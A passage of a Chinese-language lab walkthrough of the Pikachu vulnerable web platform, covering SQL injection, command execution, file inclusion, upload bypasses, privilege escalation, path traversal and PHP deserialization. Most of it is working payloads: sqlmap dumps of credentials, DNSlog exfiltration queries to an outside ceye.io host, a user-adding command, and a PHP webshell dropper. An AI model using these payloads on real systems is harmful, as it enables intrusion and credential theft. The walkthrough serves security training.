查username：1' and updatexml(1,concat('~',(select username from users limit 0,1)),1))#

查password：1' and updatexml(1,concat(0,(select password from users where username='admin')),1))#

updatexml()、extractvalue()有长度限制，将之前想用来标记位置的’~'换成0，返回完整的32位md5值，不改的话每次只能显示31个字符
```

**extractvalue()函数：**

```sql
查username：1' and extractvalue(1,concat('~',(select username from users limit 0,1))))#
查password：1' and extractvalue(1,concat(0,(select password from users where username='admin'))))#
```

**floor()函数：**

```sql
1'and (select 1 from (select count(*),concat('~',(select concat(username,'~',password) from users limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#
```

#### **update注入**

**注册账号后登录，可以修改个人信息，进入修改页面，填写四项项，性别那里输入单引号，密码输入123，页面会有报错信息(`  for the right syntax to use near '1',address='1',email='1'' where username='jwt'' at line 1`)，说明存在SQL注入漏洞**

**猜测sql语句为：**

```sql
$query="update member set sex='$sex',phonenum='$phonenum',address='$add',email='$email' where username='xxx'";
```

**构造Payload：与insert注入相似，只是闭合不同，最后少加一个`）`**

**爆库**

**updatexml()函数：**

```sql
1' and updatexml(1,concat('~',database()),1) #
```

**extractvalue()函数：**

```sql
1' and extractvalue(1,concat('~',database())) #
```

**floor()函数：**

```sql
1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)#
```

**获取其他数据库信息参照上面 insert 注入，只是闭合不同，最后少加一个`）`,这里小简我就不再赘述了。**

**参考：**

**[利用insert、update和delete注入获得数据](https://www.cnblogs.com/babers/articles/7252401.html)**

**[SQL注入之insert/update/delete注入](https://blog.csdn.net/weixin_44426869/article/details/104326877)**

**[SQL注入实战之报错注入篇（updatexml extractvalue floor）](https://www.cnblogs.com/c1047509362/p/12806297.html)**

**[web实验三——pikachu之sql注入](http://www.mamicode.com/info-detail-2864192.html)**

### **“delete”注入**

**这里有一个留言板，点删除可以把对应的留言删掉，点删除时用 BurpSuite 抓包，实际上就是传递了一个留言的 id，后台根据这个 id 去删除留言**

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727164128.png)**

**猜测sql语句为：**

```sql
$query="delete from message where id=x";
```

**发送到 `Repeater` 模块中继续进行测试，发现可能存在数字型注入漏洞，**

**构造Payload：修改id值时，需要做URL转码，再放包**

**爆库**

**updatexml()函数：**

```sql
1 and updatexml(1,concat('~',database()),1)
```

**extractvalue()函数：**

```sql
1 and extractvalue(1,concat('~',database()))
```

**floor()函数：**

```sql
1 and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727165448.png)**

**获取其他数据库信息参照上面 insert 注入，只是闭合方式不同，这里小简我就不再赘述了。**

### **"http header"注入**

**查看提示得到登录账号【admin / 123456】，登陆之后会记录以下信息**

```
你的ip地址:192.168.137.1

你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/84.0.522.44

你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

你的端口（本次连接）:tcp11004
```

**通过这些信息我们可以猜测，这个后端应该对`HTTP header`里面的数据进行了获取，应该也进行了相关数据库的操作，Burpsuite抓包进行测试，测试发现User-Agent、Accept、Cookie处存在SQL注入**

**User-Agent注入**

**修改User-Agent实现注入，这里我用注释符一直报错，所以用`and '`进行闭合**

```sql
1' and updatexml(1, concat(0x7e, database()), 1) and '
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727172454.png)**

**Accept注入**

**修改Accept实现注入**

```sql
1' and updatexml(1, concat(0x7e, database()), 1) #
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727173340.png)**

**Cookie注入**

**修改Cookie实现注入**

```sql
admin' and updatexml(1, concat(0x7e, database()), 1) #
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727172742.png)**

**这里只演示了获取数据库，想要获取其他数据库信息方法一样，只需要修改注入语句即可**

### **盲注(base on bollian)**

 **布尔注入利用情景**

- **页面上没有显示位，并且没有输出SQL语句执行错误信息**
- **只能通过页面返回正常与不正常判断**

**这里是字符型盲注，我就不讲盲注原理和手工盲注了，需要了解的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**

#### **SqlMap实现布尔盲注**

```sql
--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
--threads 10 :设置线程为10，运行速度会更快
```

```sql
#查询数据库【pikachu】 
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2"  --dbs

#获取数据库中的表【httpinfo,member,message,users,xssblind】 
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables --batch --threads 10 

#获取表中的字段名【...user,password,...】 
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2"  -D pikachu -T users --columns --batch --threads 10 

#获取字段信息
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C username,password --dump --batch --threads 10
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727215251.png)**

#### **DNSlog外带数据注入**

##### **查询数据库**

```sql
1' and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\sql_test'))),1,0)#

1' and if((select load_file(concat('\\\\',(select database()),'.8tiwyi.ceye.io\\sql_test'))),1,0)#
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095247.png)

##### **查询表**

```sql
1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095519.png)

##### **查询列**

```sql
1' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095617.png)

##### **查询值**

```sql
1' and if((select load_file(concat('\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807102111.png)

### **盲注(base on time)**

**时间注入利用情景**

- **页面上没有显示位**
- **没有输出报错语句**
- **正确的sql语句和错误的sql语句页面返回一致**

#### **SqlMap实现时间盲注**

```
--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
--technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）
--threads 10 :设置线程为10，运行速度会更快。
```

```bash
#查询数据库 #【pikachu】
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#" --technique T --current-db --batch --threads 10

#获取数据库中的表 #【httpinfo,member,message,users,xssblind】
python sqlmap.py  -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#" --technique T -D pikachu  --tables --batch --threads 10

#获取表中的字段名 #【...user,password,...】
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#" --technique T -D pikachu -T users --columns --batch --threads 10 

#获取字段信息
python sqlmap.py -u "http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#" --technique T -D pikachu -T users -C username,password --dump --batch --threads 10 
```
#### **DNSlog外带数据注入**

##### **查询数据库**

```sql
1' and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

##### **查询表**

```sql
1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

##### **查询列**

```sql
1' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```

##### **查询值**

```sql
1' and if((select load_file(concat('\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
```
### **宽字节注入**

**这里我就不讲原理了，需要了解宽字节注入原理的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**

**通过测试，发现这是post传参，所以BurpSuite抓包进行测试。**

```sql
#确定字段数
1%df' order by 1 --+  
这里用order by判断字段数量会报错,暂时不知道什么原因。

#确定显示位
-1%df' union select 1,2 --+

#查询数据库 
-1%df' union select 1,database() --+ 

#查询表名 
-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 

#查询字段名 
-1%df' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ 

这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。 

#查询字段信息 
-1%df' union select 1,group_concat(username,0x3a,password) from users --+ 
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727182636.png)**



### **SQL注入防范**

**1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；**
**2.使用参数化（Parameterized Query 或 Parameterized Statement）；**
**3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!**

## **RCE**

### **基础知识准备**

> **RCE(Remote Command/Code Execute)，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。**

#### **命令拼接符**

##### **windows**

1. **`“|”` 管道符，前面命令标准输出，后面命令的标准输入**
2. **`“&”` commandA & commandB 先运行命令A然后运行命令B**
3. **`“||”` commandA || commandB 运行命令A，如果失败则运行命令B**
4. **`“&&”` commandA && commandB 运行命令A，如果成功则运行命令B**

##### **linux**

1. **`“|”` 管道符，前面命令标准输出，后面命令的标准输入**
2. **`“&”` commandA & commandB 先运行命令A然后运行命令B**
3. **`“||”` commandA || commandB 运行命令A，如果失败则运行命令B**
4. **`“&&”` commandA && commandB 运行命令A，如果成功则运行命令B**
5. **`“;”` commandA;commandB执行完A执行B**
6. **`“%0a”` 换行符**
7. **`“%0d”` 回车符**

#### **命令执行函数**

**在PHP中，可以执行命令的函数有：**

**`system、exec、shell_exec、passthru、pcntl_exec、popen、proc_popen等`**

### **exec "ping"**

**源码分析：**

```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
    if(stristr(php_uname('s'), 'windows')){
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

**可以看到执行`shell_exec()`函数时是直接拼接的`$ip`变量，那我们可以直接拼接恶意命令进行执行。**

**因为是Windows环境，所以只能执行Windows下的命令**

**Payload:**

```
127.0.0.1 | dir
127.0.0.1 & dir
127.0.0.1 || dir
127.0.0.1 && dir
127.0.0.1 & ipconfig
127.0.0.1 | net user hack 123 /add #添加用户
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zOi6W3aQoCvgPj5.png)**

### **exec "eval"**

**源码分析：**

```php
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
```

**提交内容进入了 `@!eval`中 如果不报错就执行,报错就会输出一句话**

**Payload:**

```
phpinfo();
system("dir");
system("ipconfig");
system("whoami");
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/FeypcaCuTHD47os.png)**

## **File Inclusion**

### **简介**

> **`File Inclusion`(文件包含漏洞)，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：**
> **`include(),include_once(),require(),require_once()`,这些文件包含函数在代码设计中被经常使用到。**

	大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 

### **文件包含函数**

#### **include( )**

**当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含**
**进来，发生错误时之给出一个警告，继续向下执行。**

#### **include_once( )**

**功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次**

#### **require( )**

**require()与 include()的区别在于require()执行如果发生错误，函数会输出**
**错误信息，并终止脚本的运行。**

#### **require_once( )**

**功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。**

### **Local**

> **本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。**

**源码分析：**

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";
}
```

**`$_GET['filename']`参数开发者没有经过严格的过滤，直接带入了`include`的函数，攻击者可以修改`filename`的值，执行非预期的操作。**

**安全的写法:**

**使用白名单，严格指定包含的文件名**

```php
if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || 			$filename=='file4.php' || $filename=='file5.php'){
         include "include/$filename";
}
```

**打开平台，选择一个选项,可以看到上传了一个文件名到后台，后台打开包含的指定目标文件**

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=file1.php&submit=%E6%8F%90%E4%BA%A4
```

**Linux 或Windows，我们都可以使用 `“../”` 的方式进行目录穿越，读取其他目录下的文件**

**payload**

```
?filename=../../../../Windows/System32/drivers/etc/hosts       #读取本地域名解析文件
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/aWlPwkITdbYUGJE.png)**

### **Rrmote**

> **远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。**

**`注意：`远程包含漏洞的前提：如果使用的incldue和require，则需要在phpStudy或php.ini中配置开启下面选项**

```ini
allow_url_fopen=on //默认打开
allow_url_include=on //默认关闭
```

**源码分析：**

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";
}
```

**跟上面本地代码一样，变量传进来直接包含,没做任何的安全限制**

**打开平台，选择一个选项。同样是通过传递一个文件名进行包含的**

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E6%8F%90%E4%BA%A4
```

**因为这个限制只能读取txt文件,这里txt会被解析成php执行，所以我们写一个`yijuhua.txt`文件执行过后让他自己生成木马**

```php
<?php
$myfile = fopen("yijuhua.php", "w");
$txt = '<?php @eval($_POST['x']);?>';
fwrite($myfile, $txt);
fclose($myfile);
?>
```

**payload:**

```
?filename=http://127.0.0.1/pikachu-master/test/yijuhua.txt
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/p5ETxhGDOWcMXeN.png)**

**运行之后果然产生了一句话木马文件**

**用蚁剑进行连接**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7MJ6t2aYUDkb9Bz.png)**

**连接成功**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2eIfGw4lEKFzMq1.png)**

## **unsafe filedownload**

>**此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。**

**提示说点击球员名字即可下载头像图片**

**点击科比的会直接下载，右键点击，选择复制链接，得到如下链接**

```Payload
http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png
```

**可以看到是直接通过filename进行读取文件的，那我们来尝试下载在上一页面URL中发现的`down_nba.php`**

```Payload
http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../down_nba.php
```

**果然成功下载，当然还可以通过`../../`来构造下载其他文件**

**防范措施：**　　　　　　　　　　　　　　　　　　

**1.对传入的文件名进行严格的过滤和限定**

**2.对文件下载的目录进行严格的限定**

##  **unsafe upfileupload**

> **文件上传功能在web应用系统很常见，当用户点击上传按钮后，后台会对上传的文件进行判断,比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。**

### **client check**

**界面提示`这里只允许上传图片o！`，上传php文件会`弹框`提示`上传的文件不符合要求，请重新选择！`**

**F12检查元素,发现是通过JS进行check的，这样就很容易绕过了**

```html
<input class="uploadfile" type="file" name="uploadfile" onchange="checkFileExt(this.value)">
```

**找到check的JS代码，只对后缀名做了校验**

```javascript
function checkFileExt(filename)
{
    var flag = false; //状态
    var arr = ["jpg","png","gif"];
    //取出上传文件的扩展名
    var index = filename.lastIndexOf(".");
    var ext = filename.substr(index+1);
    //比较
    for(var i=0;i<arr.length;i++)
    {
        if(ext == arr[i])
        {
            flag = true; //一旦找到合适的，立即退出循环
            break;
        }
    }
    //条件判断
    if(!flag)
    {
        alert("上传的文件不符合要求，请重新选择！");
        location.reload(true);
    }
}
```

**绕过方法一：**

**修改`JS`，直接将`php`后缀名加上，在控制台运行，然后就可以成功上传php文件了**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092420.png)



**上传一个 info.php 内容如下：**

```php
<?php phpinfo();?>
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529092714193.png)**

**获取到上传路径后直接访问看看**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092857.png)**

**绕过方法二：**

**将info.php后缀改为png，然后上传，利用BP进行拦截，然后将png改为php重新发包**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529093908.png)**



### **MIME check**

> **MIME（Multipurpose Internet Mail Extensions）多用途互连网右键扩展类型。**
>
> **当一个浏览器对一个文件进行识别的时候，他会给文件定义一个类型，放在http的头部的Content-type里面，比如上传图片，就会自动识别是jpg或者png等**

**上传php文件，提示只能上传图片。**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529094736.png)**

**根据提示看，应该只进行了 Content-Type 类型校验，可以通过修改`MIME`类型来绕过，我们正常上传 php 文件，然后直接将其文件类型修改为 `image/png`**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529095523.png)**

**然后就可以成功上传了**

### **getimagesize**

**getimagesize 函数会检测文件是否是图片，所以得通过制作图马来绕过这个函数检测。**

**图片马制作**

- **Windows 下 图马制作**

**方法一：**
**我们需要一张图片`1.jpg `和一句话木马写好的php文件`1.php`** 
**将1.jpg和1.php放到同一目录下,**
**然后在该目录下用cmd执行命令`copy 1.jpg/b + 1.php/a 2.jpg `**
**新生成的2.jpg就是我们制作好的图片马**
**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295bd449c1993400.png)**
**方法二：**
**HxD打开一张图片`1.jpg`**
**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295be59cb6829409.png)**
**在图片末尾加上一句话木马，保存得到的图片就是图片马了**
**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295c7214fb631104.png)**

- **Linux 下 图马制作**

```bash
#方法1 将shell.php内容追加到muma.png
cat shell.php >> muma.png

#方法2 png+php合成png图马
cat a.png shell.php >> muma.png

#方法3 直接使用echo追加到png中
echo '<?php phpinfo();?>' >> muma.png
```

**将制作好的图片马上传**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110623157.png)**

**但是服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。我们需要利用前面的`文件包含漏洞`可以将图片格式的文件当做php文件来解析执行**

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2020/05/29/6589365ed07a93cc13b725773978.jpg&submit=%E6%8F%90%E4%BA%A4
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110401162.png)**



### **文件上传漏洞防范**

- **验证文件类型、后缀名、大小;**
- **验证文件的上传方式;**
- **对上传的文件进行一定复杂的重命名;**
- **不要暴露文件上传后的路径;**

##  **over permission**

> **如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为`越权操作`。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。**
>
> **因此，在在权限管理中应该遵守：**
> **1.使用最小权限原则对用户进行赋权;**
> **2.使用合理（严格）的权限校验规则;**
> **3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;**

### **水平越权**

>**A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水平越权操作。**

**1、点击右上角的提示，存在三个用户，【lucy/123456,lili/123456,kobe/123456】**

**2、登录用户lucy，可以查看lucy的信息，**

**3、我们将URL中的username改为lili或kobe，发现能成功越权查看到lili或kobe的信息，这也就说明存在水平越权漏洞**

**源码分析**

```php
// 判断是否登录，没有登录不能访问
if(!check_op_login($link)){
    header("location:op1_login.php");
}
$html='';
if(isset($_GET['submit']) && $_GET['username']!=null){
    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
    $username=escape($link, $_GET['username']);
    $query="select * from member where username='$username'";
```

 **只判断了是否登录，并没有验证传入的username是不是当前登录用户**

### **垂直越权**

> **A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。**

**1、点击右上角的提示，存在两个用户，【admin/123456,pikachu/000000,admin是超级boss】**

**2、登录超级用户admin，可以查看所有用户信息，并且可以创建新用户**

**3、点击添加用户，输入jwt用户信息，然后打开Burp，进行抓包，发现Cookie中有PHPSESSID，再发送到`repeater`，进行发包，成功添加新用户jwt**

**4、登录普通用户pikachu，只有查看用户信息的权限；然后使用Burp抓取其登录态的Cookie，将Cookie复制到上面超级管理员登录时的Cookie位置,最后点击`Go`**

**5、刷新页面,看到创建了两个jwt用户，第一个是admin创建的，第二个是pikachu创建的，普通用户pikachu也成功创建用户，这就实现了垂直越权**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200713140917.png)**

**源码分析**

```php
//目录结构
op2_admin.php
op2_admin_edit.php
op2_login.php
op2_user.php
```

**有一个`op2_login.php`，进行登录判断，如果级别是1，进入`op2_admin.php`；如果级别是2，进入`op2_user.php`，登入admin用户界面，有个`admin_edit.php`页面，可以添加新用户，但是添加新用户时，只是验证了登录状态，并没有验证级别，所以存在越权问题。**

```php
//admin_edit.php 22-25行
// 判断是否登录，没有登录不能访问
//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
if(!check_op2_login($link)){
    header("location:op2_login.php");
    exit();
}
```

### **CTF例子**

**[NKCTF-web（记一次越权）](https://blog.csdn.net/jiyi_guoshu/article/details/88544274)**

## **Directory Traversal**

>**在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。**
>
>**看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。**
>
>**需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露，而并不归为目录遍历漏洞。**

**随意点击页面，得到跳转链接。**

```
http://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=truman.php
```

**可以看到`URL`中有文件名，那我们可以进行构造，实现目录遍历**

```
?title=../../../../phpinfo.php
?title=../../../../Windows/win.ini

去掉url中的参数，列出了dir文件夹里面所有的文件，这种情景称为敏感信息泄露，而并不归为目录遍历漏洞。
http://127.0.0.1/pikachu-master/vul/dir/
```

**源码分析**

```php
$html='';
if(isset($_GET['title'])){
    $filename=$_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";
//    echo $html;
}
```

**修复**

**白名单或者过滤用户输入，比如过滤`../`**

## **敏感信息泄露**

>**由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：**
>**---通过访问url下的目录，可以直接列出目录下的文件列表;**
>**---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;**
>**---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;**
>
>**类似以上这些情况，我称为敏感信息泄露。**

**1.打开界面是一个登陆页面，查看源码发现敏感信息**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200714090924.png)**

**2.登陆之后发现abc.php**

**3.不登录直接将findabc.php改为abc.php也可访问**

## **PHP反序列化**

**在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。**

**序列化serialize()**
**序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:**

```php
    class S{
        public $test="pikachu";
    }
    $s=new S(); //创建一个对象
    serialize($s); //把这个对象进行序列化
    序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
        O:代表object
        1:代表对象名字长度为一个字符
        S:对象的名称
        1:代表对象里面有一个变量
        s:数据类型
        4:变量名称的长度
        test:变量名称
        s:数据类型
        7:变量值的长度
        pikachu:变量值
```

**反序列化unserialize()**

**就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。**

```php
    $u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
    echo $u->test; //得到的结果为pikachu
```

**序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题**

```php
        常见的几个魔法函数:
        __construct()当一个对象创建时被调用

        __destruct()当一个对象销毁时被调用

        __toString()当一个对象被当作一个字符串使用

        __sleep() 在对象在被序列化之前运行

        __wakeup将在序列化之后立即被调用

        漏洞举例:定义一个类，写一个function，这个function直接使用了魔法方法
        class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

**源码分析**

```php
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;
    }
}


//O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
$html='';
if(isset($_POST['o'])){
    $s = $_POST['o'];
    if(!@$unser = unserialize($s)){
